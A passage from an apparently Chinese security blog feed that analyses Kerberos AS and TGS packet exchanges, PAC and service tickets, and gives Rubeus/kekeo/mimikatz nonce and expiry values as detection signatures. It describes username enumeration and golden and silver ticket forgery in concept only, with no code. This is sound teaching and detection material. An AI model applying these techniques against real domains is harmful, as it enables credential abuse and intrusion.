+　　这个是启用PAC支持的扩展。PAC(Privilege Attribute Certificate)并不在原生的kerberos里面，是微软引进的扩展。PAC包含在AS_REQ的响应body(AS_REP)。这里的value对应的是include=true或者include=false(KDC根据include的值来判断返回的票据中是否携带PAC)。
+REQ_BODY 
+　　1.cname
+　　PrincipalName 类型。PrincipalName包含type和value。
+　　KRB_NT_PRINCIPAL = 1 means just the name of the principal 如daizhibin
+　　KRB_NT_SRV_INST = 2 service and other unique instance (krbtgt) 如krbtgt，cifs
+　　KRB_NT_ENTERPRISE_PRINCIPAL = 10 如 user@domain.com
+　　在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。
+　　2.sname
+　　PrincipalName 类型，在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST
+　　3.realm 域名
+　　4.from 发送时间
+　　5.till 到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为特征来检测工具。
+　　6.nonce
+　　随机生成的一个数kekeo/mimikatz nonce是12381973，rubeus nonce是1818848256，这个也可以用来作为特征检测工具。
+　　7.etype
+　　加密类型
+这个地方要注意的是如果在配置里面选择用hash(不是plaintext)的话，hash的加密类型，要跟etype一样。因为KDC是按照etype类型选择用户对应加密方式的hash，如果是选择明文(plaintext)，那么client 会按照etype里面的加密方式将明文加密成hash
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231124120208281.png" alt="image-20231124120208281" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231124120229394.png" alt="image-20231124120229394" loading="lazy"></figure>
+<p>分析AS-REP的数据包</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231124120435818.png" alt="image-20231124120435818" loading="lazy"></figure>
+<p><code>AS-REP</code>：Client发送<code>AS_REQ</code>，请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。<strong>当KDC中的AS认证服务收到后，在AS服务器中有用户hash，使用用户hash进行解密，获得时间戳</strong>，如果<strong>解密成功，并且时间戳在五分钟之内</strong>，那么<strong>预认证通过</strong>。接着AS认证服务将会向Client发送响应包，响应包中包括<strong>krbtgt用户的NTML hash加密后的TGT票据</strong>以及<strong>用户NTML Hash加密的Login Session key和其他信息</strong>。</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231124121356089.png" alt="image-20231124121356089" loading="lazy"></figure>
+<p><strong>ticket中的enc-part是由krbtgt的密码hash加密生成的。如果我们拥有krbtgt的hash，便可以自制ticket，发起黄金票据攻击</strong></p>
+<p><strong>Login Session Key使用用户NTML Hash加密，作用是用于是用于确保客户端和KDC下一阶段之间通信安全，作为下一阶段的认证密钥</strong></p>
+<pre><code>在这一阶段，Client与KDC之间的交互在于AS认证服务，主要是为了获得TGT认证票据，以及Login Session Key，经过该阶段后，Client将会使用自身密码的NTML hash解密Login Session Key得到原始的Login Session Key。然后它会在本地缓存TGT票据和原始Login Session Key
+</code></pre>
+<h3 id="tgs_reqtgs_rep">TGS_REQ&amp;TGS_REP</h3>
+<p>先前提到两个问题，第二个问题</p>
+<pre><code>（2）Client如何获取ST？
+    Client与TGS之间认证使用TGS_REQ&amp;TGS_REP模块
+</code></pre>
+<p>Client在拿到<code>TGT</code>和<code>Login Session Key</code>之后，下一步的认证交互在于<strong>KDC中的TGS认证服务</strong>，主要目的是为了获取**<code>ST服务票据</code><strong>，因为当Client需要访问某服务器中的某服务时，需要</strong>&quot;门票&quot;**--<strong>ST服务票据</strong></p>
+<p>这一阶段，微软引进了两个扩展<code>S4U2SELF</code>和<code>S4U2PROXY</code>。</p>
+<p><strong>TGS-REQ数据包分析</strong></p>
+<p>该数据包中的主要内容为：<code>客户端信息，Authenticator(Login Session Key加密的时间戳)、TGT认证权证(padata下ap-req下的ticket)以及访问的服务名</code>等。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130134731522.png" alt="image-20231130134731522" loading="lazy"></figure>
+<p><code>padata</code>部分：</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130134812150.png" alt="image-20231130134812150" loading="lazy"></figure>
+<p>在<code>padata</code>中有很重要的一部分叫做<code>AP-REQ</code>，这是<code>TGS-REQ</code>中必须有的数据，<strong>这部分会携带AS-REP里面获取到的TGT票据</strong>，<strong>KDC检验TGT票据，如果票据正确，返回ST票据</strong>。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130134912262.png" alt="image-20231130134912262" loading="lazy"></figure>
+<p><code>TGS-REQ</code>请求包中的<code>authenticator</code>就是<code>AS-REP</code>响应包返回的<code>Login Session key</code>加密的时间戳</p>
+<p><code>req-body</code>部分：</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130135014105.png" alt="image-20231130135014105" loading="lazy"></figure>
+<p>在<code>req-body</code>中</p>
+<pre><code>padding:0
+kdc-options:用于与KDC约定一些选项设置
+realm:域名
+sname:这里是要请求的服务
+till:到期时间
+    rebeus和kekeo都是20370913024805Z，可用于作为特征值检验用
+nonce:随机生成数 
+    kekeo/mimikatz的nonce为12381973，rubeus的nonce为1818848256,可用于作为特征值检验    用
+etype:加密类型
+</code></pre>
+<p><strong>分析TGS-REP数据包</strong></p>
+<p><code>TGS-REP</code>：当TGS收到请求后，将会检查自身是否存在客户端所请求的服务，如果服务存在，<strong>通过krbtgt用户的NTML hash解密TGT并且得到Login Session Key</strong>，通过<strong>Login Session Key解密Authenticator</strong>。</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130135057074.png" alt="image-20231130135057074" loading="lazy"></figure>
+<p>这一系列解密成功的话，<strong>将会验证对方的身份，验证时间戳是否在范围内，并且检查TG中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同</strong></p>
+<p>完成认证后，TGS生成<strong>ST票据（包括客户端信息和原始Server Session key，整个ST服务票据使用该服务的NTML hash加密</strong>以及一个<strong>AS-REP返回的Login-Session-Key加密的Server Session Key</strong>。这两个将在响应包中发送给Client</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130135135060.png" alt="image-20231130135135060" loading="lazy"></figure>
+<p>PS:在这一步中，不论用户是否有权限访问服务，只要TGT解密无误，都将返回ST服务票据。<strong>任何一个用户，只要hash正确，就可以请求域内任何一个服务的票据</strong></p>
+<h3 id="st票据通过认证访问服务">ST票据通过认证访问服务</h3>
+<p><strong>使用ST票据通过认证访问服务</strong></p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130135213170.png" alt="image-20231130135213170" loading="lazy"></figure>
+<p>需要强调的是，这里需要使用<strong>双向验证</strong>，因为实际情况中，需要客户端和服务器互相验证</p>
+<p>（1）服务端验证客户端：防止非法用户操作</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130135234315.png" alt="image-20231130135234315" loading="lazy"></figure>
+<p>（2）客户端验证服务端：防止误入恶意服务</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130135250120.png" alt="image-20231130135250120" loading="lazy"></figure>
+<p>PS:<strong>PAC并不是所有服务都开启的，这需要配置验证KDC PAC 签名。没有验证PAC，可能会导致白银票据攻击。因为开启PAC后，就算攻击者拥有用户hash，能制作ST票据后，无法通过PAC验证，还是无法访问服务</strong>。</p>
+<h2 id="常见的kerberos协议攻击">常见的Kerberos协议攻击</h2>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231130135340591.png" alt="image-20231130135340591" loading="lazy"></figure>
+]]></content>
+    </entry>
+</feed>
